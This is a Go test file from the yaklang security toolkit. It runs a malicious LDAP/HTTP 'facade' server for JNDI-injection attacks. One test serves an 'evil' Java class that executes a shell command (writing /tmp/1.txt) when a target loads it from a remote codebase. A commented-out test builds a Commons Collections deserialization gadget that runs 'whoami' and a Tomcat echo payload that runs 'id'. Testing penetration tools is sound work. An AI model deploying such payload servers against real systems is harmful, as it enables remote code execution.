package facades

import (
	"context"
	"fmt"
	"github.com/yaklang/yaklang/common/yso"
	"testing"
)

//	func TestNewFacadeServer(t *testing.T) {
//		s := NewFacadeServer("0.0.0.0", 9090)
//		entry := make(map[string]interface{})
//		// Deserialization application (not limited by trustURLCodebase)
//		ser, _ := yso.GetEchoCommonsCollections2()("whoami")
//		entry["javaSerializedData"] = yserx.MarshalJavaObjects(ser)
//		// class loading application (limited by trustURLCodebase, javaFactory is the name of the loaded class, and the name must be changed every time)
//		entry["javaClassName"] = "yakit_echo_class"
//		entry["javaCodeBase"] = "http://127.0.0.1:9090/"
//		entry["objectClass"] = "javaNamingReference"
//		entry["javaFactory"] = s.ClassNameFactory(5)
//		s.SetLDAPEntry(entry)
//		s.SetHttpResource(yso.GetTomcatEcho("id"))
//		ctx, cancel := context.WithCancel(context.Background())
//		defer cancel()
//		err := s.ServeWithContext(ctx)
//		if err != nil {
//			panic(err)
//		}
//	}
func TestFacadeServer(t *testing.T) {
	ip := "192.168.101.116"
	className := "test"
	//cmd := "echo 1 > /tmp/1.txt"
	s := NewFacadeServer(ip, 60010)
	c, _ := yso.GenerateRuntimeExecEvilClassObject("echo 1 > /tmp/1.txt")
	s.Config(
		SetJavaClassName("yakit_exec"),
		SetJavaCodeBase(s.GetAddr()),
		SetjavaFactory(className),
		SetObjectClass("javaNamingReference"),
		SetHttpResource(fmt.Sprintf("%s.class", className), c.Bytes()),
	)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	s.ServeWithContext(ctx)
}
